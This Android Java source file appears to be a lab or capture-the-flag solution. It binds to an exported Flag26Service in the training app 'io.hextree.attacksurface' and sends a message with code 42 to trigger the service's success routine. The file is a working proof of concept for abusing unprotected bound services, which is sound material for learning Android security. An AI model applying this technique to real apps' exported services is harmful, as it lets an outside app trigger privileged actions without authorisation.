package niraj.patali.bindingwithservices;

import androidx.appcompat.app.AppCompatActivity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MessageClient";
    private static final int MSG_SUCCESS = 42;

    private Messenger serviceMessenger = null; // Messenger to communicate with the service
    private boolean isBound = false; // Flag to track if the service is bound

    // ServiceConnection to connect to the service
    private final ServiceConnection serviceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName name, IBinder service) {
            serviceMessenger = new Messenger(service); // Get the Messenger from the service
            isBound = true;
            Log.i(TAG, "Service connected.");
            sendMessageToService(); // Send the message to trigger success()
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            serviceMessenger = null;
            isBound = false;
            Log.i(TAG, "Service disconnected.");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Start binding to the service
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);

    }

    private void sendMessageToService() {
        if (isBound && serviceMessenger != null) {
            try {
                // Create a message with what=42 to trigger success()
                Message message = Message.obtain(null, MSG_SUCCESS);
                serviceMessenger.send(message); // Send the message to the service
                Log.i(TAG, "Message sent to service.");
            } catch (RemoteException e) {
                Log.e(TAG, "Error sending message to service.", e);
            }
        } else {
            Log.w(TAG, "Service is not bound. Cannot send message.");
        }
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();

        // Unbind from the service when the activity is destroyed
        if (isBound) {
            unbindService(serviceConnection);
            isBound = false;
            Log.i(TAG, "Service unbound.");
        }
    }
}